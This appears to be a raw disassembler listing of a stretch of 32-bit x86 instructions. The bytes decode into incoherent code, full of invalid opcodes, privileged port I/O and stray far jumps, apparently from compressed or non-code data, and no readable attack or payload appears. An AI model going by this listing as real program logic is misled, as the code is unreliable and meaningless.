  420f51:	xor    bh,BYTE PTR [edi+0x7d]
  420f54:	(bad)  
  420f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f56:	imul   ebp,DWORD PTR [eax],0x66d73457
  420f5c:	xor    ebp,ebx
  420f5e:	loop   0x420f48
  420f60:	cmc    
  420f61:	lds    esp,FWORD PTR [ebx-0x28]
  420f64:	xchg   ebp,eax
  420f65:	mov    BYTE PTR [esi+0x7f4b7f57],al
  420f6b:	sbb    DWORD PTR ds:0x50831fe1,esp
  420f71:	fstp   QWORD PTR [esi+0x3e]
  420f74:	repz xor esp,esi
  420f77:	dec    eax
  420f78:	cmp    DWORD PTR [edi-0x58],ebp
  420f7b:	push   eax
  420f7c:	pusha  
  420f7d:	jb     0x420f21
  420f7f:	(bad)  
  420f80:	dec    ecx
  420f81:	push   ebp
  420f82:	sbb    BYTE PTR [ebx],al
  420f84:	pop    ebx
  420f85:	xchg   ecx,eax
  420f86:	dec    edx
  420f87:	fsub   DWORD PTR [eax-0x3543b486]
  420f8d:	jnp    0x420fa1
  420f8f:	retf   
  420f90:	pop    edi
  420f91:	push   esp
  420f92:	out    0x7,eax
  420f94:	cmp    edx,edx
  420f96:	adc    eax,0x63c4ccea
  420f9b:	pop    ds
  420f9c:	sbb    ebx,ebx
  420f9e:	jne    0x420f62
  420fa0:	pop    ecx
  420fa1:	(bad)  
  420fa2:	dec    edx
  420fa3:	sbb    ecx,DWORD PTR [ebp+eiz*4+0x1d]
  420fa7:	mov    al,0x1b
  420fa9:	fldcw  WORD PTR [esi-0x35]
  420fac:	imul   DWORD PTR [edi]
  420fae:	ja     0x42101a
  420fb0:	sub    al,0xe4
  420fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fb3:	cmc    
  420fb4:	(bad)  
  420fb5:	aaa    
  420fb6:	cmp    eax,0x4f320f96
  420fbb:	imul   ecx,ebx,0x24
  420fbe:	shl    DWORD PTR [ebp-0x5cfcf774],1
  420fc4:	(bad)  
  420fc5:	aas    
  420fc6:	icebp  
  420fc7:	gs inc edi
  420fc9:	std    
  420fca:	js     0x420f71
  420fcc:	scas   al,BYTE PTR es:[edi]
  420fcd:	idiv   DWORD PTR [ecx-0x74108861]
  420fd3:	inc    ecx
  420fd4:	xor    ecx,DWORD PTR ds:0xf1a5541f
  420fda:	adc    ah,BYTE PTR [esi+0x1c743e1d]
  420fe0:	imul   eax,DWORD PTR [edx-0x68bebe6c],0xd
  420fe7:	xor    al,0x40
  420fe9:	sbb    al,0x18
  420feb:	dec    edi
  420fec:	popf   
  420fed:	jne    0x420fe8
  420fef:	(bad)  
  420ff0:	push   ebp
  420ff1:	stos   BYTE PTR es:[edi],al
  420ff2:	push   ebx
  420ff3:	je     0x421029
  420ff5:	cs iret 
  420ff7:	repz (bad) 
  420ff9:	cmp    BYTE PTR [edi+0x67],ch
  420ffc:	inc    ecx
  420ffd:	xor    eax,0x932b6d77
  421002:	xchg   ecx,eax
  421003:	in     al,0x87
  421005:	frstor [eax]
  421007:	outs   dx,DWORD PTR ds:[esi]
  421008:	nop
  421009:	sub    al,0x3b
  42100b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42100c:	fld    QWORD PTR [ecx]
  42100e:	lock popa 
  421010:	xor    eax,0xcd1b94ab
  421015:	ss jnp 0x420ff8
  421018:	inc    ebp
  421019:	pushf  
  42101a:	cmp    ch,BYTE PTR [esi-0x116201af]
  421020:	xor    cl,ah
  421022:	cmp    DWORD PTR [ecx+0x63],eax
  421025:	pop    ss
  421026:	and    eax,0x8d392cf
  42102b:	ins    BYTE PTR es:[edi],dx
  42102c:	repz ret 0x9623
  421030:	sub    edx,eax
  421032:	data16 cmc 
  421034:	pop    ebx
  421035:	pop    ebp
  421036:	adc    ebp,DWORD PTR [ecx]
  421038:	shr    BYTE PTR [edi+0x30],0x2d
  42103c:	push   edx
  42103d:	enter  0x4eb7,0x51
  421041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421042:	fs xor edx,eax
  421045:	sbb    DWORD PTR [ebx],esp
  421047:	mov    fs,ebp
  421049:	movlps xmm5,QWORD PTR [ecx]
  42104c:	jg     0x4210b8
  42104e:	icebp  
  42104f:	xchg   ebx,eax
  421050:	ins    BYTE PTR es:[edi],dx
  421051:	stc    
  421052:	sbb    BYTE PTR [ecx+eax*2],dl
  421055:	sti    
  421056:	and    cl,cl
  421058:	sub    ebx,ebp
  42105a:	sti    
  42105b:	lods   eax,DWORD PTR ds:[esi]
  42105c:	rcr    BYTE PTR [edx],1
  42105e:	(bad)  
  42105f:	int3   
  421060:	xchg   DWORD PTR [edx+edx*8],eax
  421063:	cld    
  421064:	fstp   DWORD PTR [ecx+0x331cade3]
  42106a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42106b:	push   cs
  42106c:	repnz add BYTE PTR [edx+0x1bcc9566],ah
  421073:	sbb    ebp,DWORD PTR [ebp+0x79]
  421076:	add    eax,0xc3d6733e
  42107b:	pusha  
  42107c:	jbe    0x420fff
  42107e:	jo     0x421009
  421080:	xor    BYTE PTR [edx],cl
  421082:	mov    ds:0xabfe5182,al
  421087:	xchg   ebx,eax
  421088:	fld    DWORD PTR [edx-0x53aec624]
  42108e:	lock sub al,0x9c
  421091:	in     al,dx
  421092:	mov    eax,0x5fc53b36
  421097:	pop    eax
  421098:	pop    ebx
  421099:	xor    bl,BYTE PTR [ecx-0x499b73ec]
  42109f:	or     esi,eax
  4210a1:	rcl    BYTE PTR [ecx],1
  4210a3:	fimul  WORD PTR [ebp+0x307f812c]
  4210a9:	mov    ds:0x43fc4bba,eax
  4210ae:	cmp    al,0x13
  4210b0:	sub    esi,DWORD PTR [edi]
  4210b2:	es into 
  4210b4:	pop    edx
  4210b5:	jb     0x4210e8
  4210b7:	and    dh,BYTE PTR [edx]
  4210b9:	div    DWORD PTR [ebx+ecx*8-0xf]
  4210bd:	cmp    al,0x1b
  4210bf:	add    DWORD PTR [eax+0x775d9259],0xbac504dc
  4210c9:	mul    ebx
  4210cb:	rol    DWORD PTR [edx+0x2b],0xc9
  4210cf:	fwait
  4210d0:	mov    dh,0x4a
  4210d2:	mov    ds:0x512dac07,eax
  4210d7:	ds xor eax,0x765fb473
  4210dd:	fst    DWORD PTR [esi]
  4210df:	xor    BYTE PTR [ebx+0x71ad3a4e],bh
  4210e5:	das    
  4210e6:	ret    
  4210e7:	pop    esp
  4210e8:	nop
  4210e9:	push   ecx
  4210ea:	ins    BYTE PTR es:[edi],dx
  4210eb:	sti    
  4210ec:	add    cl,dl
  4210ee:	jnp    0x4210a7
  4210f0:	xchg   edx,eax
  4210f1:	lea    ebx,[edx+0x31c5e0da]
  4210f7:	or     DWORD PTR [eax-0x6241115a],edx
  4210fd:	ficomp DWORD PTR ds:0x50ef2886
  421103:	push   ebp
  421104:	add    ch,ch
  421106:	inc    ecx
  421107:	loopne 0x42113c
  421109:	inc    esp
  42110a:	add    dl,BYTE PTR [ebp-0x23]
  42110d:	fs sub eax,0x12553719
  421113:	popa   
  421114:	xor    DWORD PTR [ebx+0x22],eax
  421117:	jge    0x4210ae
  421119:	cmp    al,0x31
  42111b:	aam    0xd4
  42111d:	outs   dx,BYTE PTR ds:[esi]
  42111e:	xchg   cl,ah
  421120:	ffree  st(3)
  421122:	mov    DWORD PTR [edx],edi
  421124:	sbb    al,0xff
  421126:	and    ecx,DWORD PTR [ebp-0xcabb944]
  42112c:	shl    BYTE PTR [eax+eax*8+0x4a3280dc],cl
  421133:	inc    esp
  421134:	add    cl,BYTE PTR [ebp+0x14]
  421137:	repz sub al,0xde
  42113a:	dec    edi
  42113b:	enter  0xa7d,0x2e
  42113f:	adc    dh,al
  421141:	stos   BYTE PTR es:[edi],al
  421142:	xor    ebx,DWORD PTR [eax-0x1afdfbd4]
  421148:	sub    BYTE PTR [ebp-0x1c9b8cf3],ah
  42114e:	jnp    0x421105
  421150:	pop    ds
  421151:	loope  0x421118
  421153:	push   edx
  421154:	cmp    al,0x70
  421156:	mov    al,ds:0xd737b37f
  42115b:	xor    esi,DWORD PTR [edi+ebp*2-0x68938767]
  421162:	call   0xc71c:0xcd5a5693
  421169:	dec    edi
  42116a:	loope  0x4211b0
  42116c:	mov    bl,0x7e
  42116e:	retf   
  42116f:	fld    TBYTE PTR [eax]
  421171:	pop    ss
  421172:	int3   
  421173:	jb     0x421161
  421175:	or     al,0xc7
  421177:	enter  0xdf26,0x3e
  42117b:	or     eax,0xe2816559
  421180:	daa    
  421181:	pop    edx
  421182:	repnz adc BYTE PTR [edi+0x2458a0e9],dl
  421189:	les    edi,FWORD PTR [esi]
  42118b:	ins    DWORD PTR es:[edi],dx
  42118c:	cmp    al,0xe9
  42118e:	cmc    
  42118f:	xchg   ecx,eax
  421190:	and    bl,ah
  421192:	mov    eax,ds:0xe2442e37
  421197:	mov    al,ds:0xfa8a6020
  42119c:	ror    bl,cl
  42119e:	add    DWORD PTR [edi+0x33],ecx
  4211a1:	inc    ebx
  4211a2:	test   DWORD PTR [edi+0x2c],edx
  4211a5:	hlt    
  4211a6:	shl    DWORD PTR [edx+edx*1-0x32],cl
  4211aa:	rol    BYTE PTR [ebx+eax*4],cl
  4211ad:	mov    WORD PTR [esi-0x4e9c0828],?
  4211b3:	inc    ecx
  4211b4:	dec    esp
  4211b5:	mov    cl,0x9a
  4211b7:	mov    esp,0xa97a0b42
  4211bc:	xchg   edx,eax
  4211bd:	or     al,0x57
  4211bf:	cmp    ch,BYTE PTR ds:0xb2523f4c
  4211c5:	ret    0x5185
  4211c8:	mov    al,0xc7
  4211ca:	dec    esi
  4211cb:	xchg   ch,al
  4211cd:	test   al,0x9
  4211cf:	das    
  4211d0:	out    0xb,eax
  4211d2:	mov    eax,DWORD PTR [ebx-0x40]
  4211d5:	ins    DWORD PTR es:[edi],dx
  4211d6:	or     esp,DWORD PTR [edi]
  4211d8:	xchg   esp,eax
  4211d9:	push   es
  4211da:	popa   
  4211db:	xlat   BYTE PTR ds:[ebx]
  4211dc:	or     al,0xa1
  4211de:	inc    ecx
  4211df:	call   0xa306:0x5b0d17e7
  4211e6:	mov    esp,0xd4cdfcc5
  4211eb:	ins    DWORD PTR es:[edi],dx
  4211ec:	jnp    0x421184
  4211ee:	jns    0x4211cd
  4211f0:	fcomp  QWORD PTR [esp+esi*2-0x1e50edd4]
  4211f7:	push   edi
  4211f8:	adc    DWORD PTR [esi],esp
  4211fa:	cmp    DWORD PTR [edx-0x353ae8ee],edi
  421200:	sub    al,0xc3
  421202:	ss into 
  421204:	jno    0x4211c7
  421206:	clc    
  421207:	fild   DWORD PTR [ecx]
  421209:	add    eax,0x121980c2
  42120e:	cld    
  42120f:	xor    BYTE PTR [eax+ebx*1+0xfe6cf2],cl
  421216:	mov    edx,0xef56f8de
  42121b:	ins    DWORD PTR es:[edi],dx
  42121c:	and    eax,0x4845400c
  421221:	mov    dh,0x7a
  421223:	inc    ebx
  421224:	push   edx
  421225:	push   esp
  421226:	or     BYTE PTR [edx+ebp*1+0x5663287],0x81
  42122e:	adc    edx,DWORD PTR [ebx+0x57dff139]
  421234:	mov    edx,0xae398792
  421239:	aad    0x94
  42123b:	and    al,0x37
  42123d:	xor    dh,BYTE PTR [esp+ebp*8]
  421240:	sub    ah,BYTE PTR ds:0x485861
  421246:	and    dl,BYTE PTR [esi+0x6e]
  421249:	mov    ch,0x89
  42124b:	jmp    0x421291
  42124d:	outs   dx,DWORD PTR ds:[esi]
  42124e:	and    DWORD PTR [ebp+0x64d4b623],eax
  421254:	mov    WORD PTR [eax-0x64],fs
  421257:	repnz les esp,FWORD PTR [ebp-0x6d]
  42125b:	mov    al,ds:0x9c55f2c9
  421260:	push   0x660cf324
  421265:	sbb    ebp,edx
  421267:	xchg   ah,dl
  421269:	add    DWORD PTR [edi+ebx*8],esp
  42126c:	rcl    DWORD PTR [ebx+ecx*8+0xf],1
  421270:	scas   eax,DWORD PTR es:[edi]
  421271:	lock and eax,0x9d2e6ad3
  421277:	(bad)  
  421279:	xor    DWORD PTR [edx],ebx
  42127b:	ins    BYTE PTR es:[edi],dx
  42127c:	or     al,0x35
  42127e:	push   esi
  42127f:	jnp    0x421297
  421281:	mov    eax,ds:0x820b7af8
  421286:	(bad)
  421289:	inc    eax
  42128a:	inc    eax
  42128b:	xchg   esi,eax
  42128c:	push   esi
  42128d:	mov    al,ds:0x6df54a6a
  421292:	push   0xfffffff5
  421294:	scas   eax,DWORD PTR es:[edi]
  421295:	jmp    FWORD PTR [ecx]
  421297:	(bad)  
  421298:	out    0xc9,eax
  42129a:	mov    cl,0x3d
  42129c:	hlt    
  42129d:	imul   ecx,edx,0x43
  4212a0:	pop    ebp
  4212a1:	add    DWORD PTR [edi+0x14],esp
  4212a4:	xor    al,0x8f
  4212a6:	mov    dh,0x6b
  4212a8:	ins    BYTE PTR es:[edi],dx
  4212a9:	je     0x421267
  4212ab:	adc    dl,BYTE PTR [edx-0x63]
  4212ae:	mov    edi,0x213319c8
  4212b3:	in     eax,dx
  4212b4:	ret    0xbec1
  4212b7:	dec    edx
  4212b8:	xchg   DWORD PTR [ebx],ebx
  4212ba:	fdiv   DWORD PTR [edx+0x53b4bead]
  4212c0:	mov    edx,0x3d63b3fd
  4212c5:	in     al,dx
  4212c6:	ins    BYTE PTR es:[edi],dx
  4212c7:	push   eax
  4212c8:	aad    0x91
  4212ca:	jge    0x421279
  4212cc:	mov    eax,eax
  4212ce:	or     BYTE PTR [edx+0x2d39c703],dh
  4212d4:	mov    ebp,0xc08f63b
  4212d9:	outs   dx,BYTE PTR ds:[esi]
  4212da:	fcom   st(2)
  4212dc:	pop    esi
  4212dd:	mov    eax,ds:0xb459ebb6
  4212e2:	inc    ebx
  4212e3:	inc    edi
  4212e4:	test   BYTE PTR [edi],bh
  4212e6:	(bad)  
  4212e8:	mov    ecx,edi
  4212ea:	lods   al,BYTE PTR ds:[esi]
  4212eb:	jmp    0x421283
  4212ed:	push   0xffffffad
  4212ef:	xchg   BYTE PTR [edx],bh
  4212f1:	mov    ch,0x4d
  4212f3:	hlt    
  4212f4:	in     eax,dx
  4212f5:	xor    eax,0xd71379c5
  4212fa:	imul   eax,DWORD PTR [edx+0x5a],0xffffff96
  4212fe:	xlat   BYTE PTR ds:[ebx]
  4212ff:	cld    
  421300:	out    dx,eax
  421301:	mov    esi,DWORD PTR [ecx+ebx*4]
  421304:	repnz fbstp TBYTE PTR [esi]
  421307:	adc    DWORD PTR [ebx],eax
  421309:	fmul   QWORD PTR [esi+0x77]
  42130c:	fidiv  DWORD PTR [eax]
  42130e:	cwde   
  42130f:	dec    edx
  421310:	std    
  421311:	cli    
  421312:	sub    BYTE PTR [edx-0x59],dl
  421315:	sub    BYTE PTR [edi-0x5d],0xc1
  421319:	stos   BYTE PTR es:[edi],al
  42131a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42131c:	cmp    al,BYTE PTR [edx]
  42131e:	jp     0x421335
  421320:	aas    
  421321:	call   0xaf19:0x22659c23
  421328:	adc    al,0x92
  42132a:	add    BYTE PTR [eax-0x3a],bh
  42132d:	ins    BYTE PTR es:[edi],dx
  42132e:	cmp    BYTE PTR [ebp-0x63],dh
  421331:	jmp    0x68ecbea4
  421336:	sbb    ecx,DWORD PTR [edi]
  421338:	cmp    BYTE PTR [ecx-0x2b],ah
  42133b:	add    ch,BYTE PTR [eax-0xd552b0]
  421341:	fnstcw WORD PTR [ecx]
  421343:	pop    ds
  421344:	data16 lock in al,dx
  421347:	clc    
  421348:	mov    eax,ds:0x20c83f3f
  42134d:	mov    eax,ds:0x29695201
  421352:	fbstp  TBYTE PTR [edx]
  421354:	hlt    
  421355:	push   0x1a
  421357:	jl     0x4212e2
  421359:	or     DWORD PTR [ecx-0x7a6e678f],ecx
  42135f:	cmp    ebx,DWORD PTR [eax-0x8]
  421362:	sub    dl,BYTE PTR [eax-0x6]
  421365:	data16 out dx,al
  421367:	mov    ebp,0x1104d504
  42136c:	inc    ebp
  42136d:	retf   
  42136e:	mov    eax,ds:0xbf73379b
  421373:	pop    ebx
  421374:	jne    0x4213eb
  421376:	out    dx,al
  421377:	test   BYTE PTR [eax+esi*4],bh
  42137a:	in     al,0x57
  42137c:	(bad)  
  42137d:	and    BYTE PTR [ebp+0x6bc85029],ch
  421383:	and    al,0x2e
  421385:	ins    BYTE PTR es:[edi],dx
  421386:	cmp    cl,BYTE PTR [eax]
  421388:	xlat   BYTE PTR ds:[ebx]
  421389:	pop    esi
  42138a:	retf   
  42138b:	jle    0x4213e8
  42138d:	xor    edi,DWORD PTR [eax]
  42138f:	add    DWORD PTR [ecx-0x69],edx
  421392:	sub    eax,0xfe3b307c
  421397:	mov    cl,ch
  421399:	cwde   
  42139a:	shl    ecx,1
  42139c:	or     ebx,DWORD PTR [eax]
  42139e:	mov    edx,esp
  4213a0:	adc    al,ah
  4213a2:	test   BYTE PTR [edi+0x4e46d26d],al
  4213a8:	pop    ebp
  4213a9:	into   
  4213aa:	push   0x5f
  4213ac:	idiv   edx
  4213ae:	mov    eax,ds:0x304920b5
  4213b3:	lods   al,BYTE PTR ds:[esi]
  4213b4:	push   esp
  4213b5:	mov    esp,0xd7cebbe6
  4213ba:	call   0xdd8bb5a4
  4213bf:	fcmovbe st,st(7)
  4213c1:	dec    edi
  4213c2:	out    0x97,eax
  4213c4:	mov    cl,0x3d
  4213c6:	lods   eax,DWORD PTR ds:[esi]
  4213c7:	and    al,0xb1
  4213c9:	or     eax,0x2bf70dc2
  4213ce:	pop    es
  4213cf:	lock aam 0x48
  4213d2:	ins    BYTE PTR es:[edi],dx
  4213d3:	xor    eax,0x9a2a892
  4213d8:	jl     0x421386
  4213da:	jmp    0x9d11:0xa98cd771
  4213e1:	loope  0x4213e0
  4213e3:	fsubr  st(2),st
  4213e5:	mov    ecx,0x59e1c80c
  4213ea:	cmp    DWORD PTR [esi],esp
  4213ec:	iret   
  4213ed:	push   ecx
  4213ee:	xor    ebx,ebp
  4213f0:	sub    ebx,esp
  4213f2:	scas   al,BYTE PTR es:[edi]
  4213f3:	addr16 mov bl,0x89
  4213f6:	mov    ds:0x7855278c,eax
  4213fb:	and    BYTE PTR [eax+eiz*1+0x6f8fd5a9],0xb
  421403:	pop    ebx
  421404:	sbb    ah,0xc
  421407:	les    edi,FWORD PTR [edi+0xe43097d]
  42140d:	fbstp  TBYTE PTR [ecx+edi*1]
  421410:	pushf  
  421411:	push   edx
  421412:	adc    al,bl
  421414:	push   ss
  421415:	pushf  
  421416:	mul    ah
  421418:	jl     0x42144e
  42141a:	enter  0xddc4,0x52
  42141e:	cdq    
  42141f:	pop    ebx
  421420:	adc    bl,al
  421422:	bound  esp,QWORD PTR [ecx-0x1d]
  421425:	sub    dh,BYTE PTR [ebx-0x663e1691]
  42142b:	shl    DWORD PTR [edi-0x62],0x9e
  42142f:	out    dx,al
  421430:	cld    
  421431:	xchg   edx,eax
  421432:	sbb    ah,cl
  421434:	jb     0x4214a9
  421436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421437:	push   ebp
  421438:	test   al,0xcc
  42143a:	or     ecx,DWORD PTR ds:0x6395f238
  421440:	dec    edi
  421441:	xchg   ecx,eax
  421442:	or     al,0xa9
  421444:	rol    BYTE PTR [ecx],cl
  421446:	xchg   esp,eax
  421447:	scas   al,BYTE PTR es:[edi]
  421448:	shr    BYTE PTR ds:0x4ae460d9,cl
  42144e:	cdq    
  42144f:	jl     0x421480
  421451:	xchg   ebx,eax
  421452:	int3   
  421453:	call   0xd5e0:0x5a1ecc8
  42145a:	mov    bl,0x9b
  42145c:	adc    BYTE PTR [edx],bl
  42145e:	inc    BYTE PTR [ebx]
  421460:	pop    edi
  421461:	push   eax
  421462:	xor    dl,BYTE PTR [edx]
  421464:	sbb    DWORD PTR [edi-0x32aca175],esi
  42146a:	push   ecx
  42146b:	mov    edx,0x54d175e6
  421470:	jne    0x421424
  421472:	mov    cl,0x22
  421474:	sbb    BYTE PTR [edx+0x40],ch
  421477:	mov    cl,0xf0
  421479:	jge    0x4214e8
  42147b:	scas   eax,DWORD PTR es:[edi]
  42147c:	mov    bl,0x67
  42147e:	out    dx,eax
  42147f:	bound  esp,QWORD PTR [esi]
  421481:	clc    
  421482:	in     eax,0x25
  421484:	addr16 mov cl,0x16
  421487:	jae    0x4214e9
  421489:	imul   eax,DWORD PTR [eax+0x5a],0x5e084366
  421490:	je     0x421429
  421492:	dec    edx
  421493:	jecxz  0x421499
  421495:	ins    DWORD PTR es:[edi],dx
  421496:	ret    
  421497:	or     eax,0x26d75c98
  42149c:	lock data16 rcr BYTE PTR ss:0xc896022f,1
  4214a5:	jno    0x421508
  4214a7:	rcl    DWORD PTR [ecx-0x252108b0],cl
  4214ad:	fcomip st,st(6)
  4214af:	int    0x84
  4214b1:	clc    
  4214b2:	sbb    BYTE PTR [edx+0x6ff95739],0xe9
  4214b9:	in     al,dx
  4214ba:	cmp    eax,0x8ff4a3fb
  4214bf:	ja     0x421502
  4214c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214c2:	xchg   BYTE PTR ds:0x18d93167,ah
  4214c8:	fbld   TBYTE PTR ds:0xd4d7f9c5
  4214ce:	dec    ecx
  4214cf:	or     al,BYTE PTR [ecx+ebx*1]
  4214d2:	jne    0x421533
  4214d4:	cmp    BYTE PTR ds:0xedc01afb,cl
  4214da:	call   0x35ae:0x4e0c1de3
  4214e1:	pop    ds
  4214e2:	and    esi,edi
  4214e4:	adc    al,0x2c
  4214e6:	pop    es
  4214e7:	mov    ds:0x42facd22,eax
  4214ec:	mov    bl,BYTE PTR [edx+esi*2]
  4214ef:	xor    eax,0x4782edaa
  4214f4:	jae    0x4214de
  4214f6:	jl     0x4214a7
  4214f8:	mov    eax,0x10fa8db3
  4214fd:	mov    dh,0xcd
  4214ff:	(bad)  
  421500:	mov    ebx,DWORD PTR [ebx+0x66ccac0a]
  421506:	xchg   ebx,eax
  421507:	sbb    eax,0x58a7aaba
  42150c:	xor    DWORD PTR [ecx+0x50],ebp
  42150f:	(bad)  
  421511:	mov    ds:0xa1515a4a,al
  421516:	out    0xaf,al
  421518:	daa    
  421519:	inc    ebp
  42151a:	jmp    0x42154b
  42151c:	call   0x8427d70c
  421521:	sbb    eax,0x118ead0d
  421526:	lods   eax,DWORD PTR ds:[esi]
  421527:	jg     0x42156a
  421529:	adc    DWORD PTR [ebx+0x52],ecx
  42152c:	outs   dx,DWORD PTR ds:[esi]
  42152d:	outs   dx,BYTE PTR ds:[esi]
  42152e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42152f:	mov    eax,ds:0x9f8a7038
  421534:	lahf   
  421535:	out    0xfa,al
  421537:	test   eax,0x9d949cf6
  42153c:	cdq    
  42153d:	dec    edi
  42153e:	int    0x6c
  421540:	es add edx,edi
  421543:	pusha  
  421544:	into   
  421545:	jae    0x42156b
  421547:	inc    edi
  421548:	paddb  mm1,QWORD PTR [edi+0x66b6ce7e]
  42154f:	sbb    bh,dl
  421551:	and    DWORD PTR ss:[edx],ecx
  421554:	in     al,dx
  421555:	fisttp DWORD PTR [edx-0x73]
  421558:	push   ebx
  421559:	int    0xf3
  42155b:	icebp  
  42155c:	or     al,0x27
  42155e:	pop    edx
  42155f:	int3   
  421560:	mov    al,ds:0x4e56fd62
  421565:	mov    DWORD PTR ds:0x64465fe,ecx
  42156b:	div    BYTE PTR [ebp+0x72]
  42156e:	ret    0xef1a
  421571:	xchg   esp,eax
  421572:	lahf   
  421573:	and    al,0x6e
  421575:	mov    ds:0xbedf40d6,eax
  42157a:	mov    BYTE PTR gs:[ecx+0x58],0xd0
  42157f:	xor    BYTE PTR [edi],cl
  421581:	push   cs
  421582:	shl    edi,1
  421584:	xor    dl,bh
  421586:	cmp    al,0xe
  421588:	mov    eax,0xe919ebed
  42158d:	adc    esi,ebp
  42158f:	add    ebx,edi
  421591:	push   ebp
  421592:	mov    DWORD PTR [edx-0x714d8200],esi
  421598:	pop    edi
  421599:	xchg   edi,eax
  42159a:	jae    0x4215a2
  42159c:	and    DWORD PTR [esi],ebp
  42159e:	gs test al,0x92
  4215a1:	push   ebx
  4215a2:	adc    DWORD PTR [ecx],edx
  4215a4:	mov    esi,ss
  4215a6:	mov    ecx,esp
  4215a8:	rcr    DWORD PTR [edi],0xd1
  4215ab:	or     DWORD PTR [esi-0x44],ebx
  4215ae:	mov    cl,0x56
  4215b0:	test   eax,0x8246e25d
  4215b6:	test   al,0x93
  4215b8:	test   DWORD PTR ds:0xe9d11eac,ecx
  4215be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215bf:	and    ecx,eax
  4215c1:	pop    ebx
  4215c2:	in     eax,0xdc
  4215c4:	lods   al,BYTE PTR ds:[esi]
  4215c5:	jge    0x421628
  4215c7:	xchg   edx,eax
  4215c8:	push   esp
  4215c9:	mov    cs,WORD PTR [edi]
  4215cb:	daa    
  4215cc:	mov    ch,0x39
  4215ce:	pop    es
  4215cf:	lock jno 0x42157c
  4215d2:	(bad)  
  4215d4:	push   DWORD PTR [ebx+0x8b332a0]
  4215da:	mov    edi,0x3e3505eb
  4215df:	mov    bl,BYTE PTR es:[esi-0x16a667d6]
  4215e6:	pop    ebx
  4215e7:	adc    DWORD PTR [eax-0x6e],edx
  4215ea:	push   ebp
  4215eb:	sbb    eax,DWORD PTR ds:0x2d7952f
  4215f1:	xchg   ecx,eax
  4215f2:	pop    ds
  4215f3:	test   BYTE PTR [edi+0x50],al
  4215f6:	jne    0x421627
  4215f8:	test   al,0x38
  4215fa:	mov    ch,0x13
  4215fc:	cmp    bl,0x42
  4215ff:	jp     0x42166e
  421601:	rcr    ch,cl
  421603:	xor    eax,0xcd30e9ca
  421608:	das    
  421609:	out    dx,eax
  42160a:	adc    al,0xea
  42160c:	iret   
  42160d:	mov    cl,0xdb
  42160f:	stos   DWORD PTR es:[edi],eax
  421610:	and    al,0x1e
  421612:	rcr    DWORD PTR [esi+0x64],1
  421615:	pop    esp
  421616:	mov    BYTE PTR [ecx+0x51],dl
  421619:	out    0xba,al
  42161b:	mov    DWORD PTR [ecx+0x34b50356],esp
  421621:	dec    ebx
  421622:	xchg   DWORD PTR [edx+0x68],ecx
  421625:	mov    esp,0xa59bfd40
  42162a:	xor    bl,bl
  42162c:	adc    eax,eax
  42162e:	icebp  
  42162f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421630:	addr16 inc edx
  421632:	loopne 0x421671
  421634:	lds    edi,FWORD PTR [eax-0x64]
  421637:	push   ds
  421638:	mov    al,0x85
  42163a:	daa    
  42163b:	into   
  42163c:	leave  
  42163d:	xchg   eax,esp
  42163f:	icebp  
  421640:	aaa    
  421641:	sar    DWORD PTR [eax+eax*4+0x66a87157],1
  421648:	mov    ds:0x7b8a44aa,eax
  42164d:	mov    ch,0x92
  42164f:	inc    BYTE PTR [edi]
  421651:	mov    DWORD PTR [eax+0x7],ecx
  421654:	mov    edi,0xf2c00c74
  421659:	call   0x74760783
  42165e:	fld    TBYTE PTR [ebx]
  421660:	adc    edx,ebx
  421662:	sbb    BYTE PTR [ebx-0x1c],0xf6
  421666:	xchg   BYTE PTR [ebx],ah
  421668:	jg     0x4216c2
  42166a:	jne    0x42167d
  42166c:	sti    
  42166d:	stc    
  42166e:	jno    0x42166c
  421670:	pop    esi
  421671:	or     eax,0x5831f7d5
  421677:	xor    DWORD PTR [eax-0x1c573313],esp
  42167d:	lods   eax,DWORD PTR ds:[esi]
  42167e:	call   0xed68:0x2cb59e13
  421685:	in     eax,dx
  421686:	xor    eax,0xc5814e5d
  42168b:	js     0x4216d0
  42168d:	daa    
  42168e:	pop    eax
  42168f:	sbb    eax,DWORD PTR [edx+0x62]
  421692:	arpl   WORD PTR [edi+edx*8],bp
  421695:	outs   dx,BYTE PTR ds:[esi]
  421696:	xor    DWORD PTR [ebx-0x4e],0x31
  42169a:	lea    ebx,[esi]
  42169c:	cdq    
  42169d:	cli    
  42169e:	dec    eax
  42169f:	xor    eax,DWORD PTR [eax+0x7da7a94a]
  4216a5:	mov    DWORD PTR [ebx],ebp
  4216a7:	mov    ebp,0x20fb61d6
  4216ac:	inc    eax
  4216ad:	fwait
  4216ae:	shr    BYTE PTR [edi+0xb],0xb9
  4216b2:	dec    edi
  4216b3:	out    dx,al
  4216b4:	scas   al,BYTE PTR es:[edi]
  4216b5:	test   BYTE PTR [edi-0x58fd5235],bl
  4216bb:	inc    eax
  4216bc:	jmp    0x421690
  4216be:	or     al,0xd4
  4216c0:	jns    0x4216fe
  4216c2:	push   0x45
  4216c4:	xchg   ecx,ecx
  4216c6:	(bad)  
  4216c7:	push   0x14cbc8ec
  4216cc:	adc    ebx,ebp
  4216ce:	push   0x5651a734
  4216d3:	cmp    esp,esi
  4216d5:	iret   
  4216d6:	or     edx,0x24
  4216d9:	cli    
  4216da:	cs dec esi
  4216dc:	pop    ecx
  4216dd:	and    dl,BYTE PTR [ebx]
  4216df:	mov    ah,0x15
  4216e1:	inc    ebx
  4216e2:	punpcklwd mm7,DWORD PTR ds:0xc3d97379
  4216e9:	add    bl,dl
  4216eb:	shl    ecx,1
  4216ed:	dec    eax
  4216ee:	mov    al,ds:0x10856a06
  4216f3:	ret    
  4216f4:	mov    WORD PTR [esp+eiz*8],?
  4216f7:	add    esp,edi
  4216f9:	(bad)  
  4216fa:	cmc    
  4216fb:	in     eax,0x4a
  4216fd:	adc    edx,DWORD PTR [esi+ebx*2+0x42]
  421701:	vsubps xmm2,xmm2,XMMWORD PTR [ebx-0x41]
  421706:	add    al,0x90
  421708:	sub    al,0x5
  42170a:	cmp    BYTE PTR [eax+0x43],dl
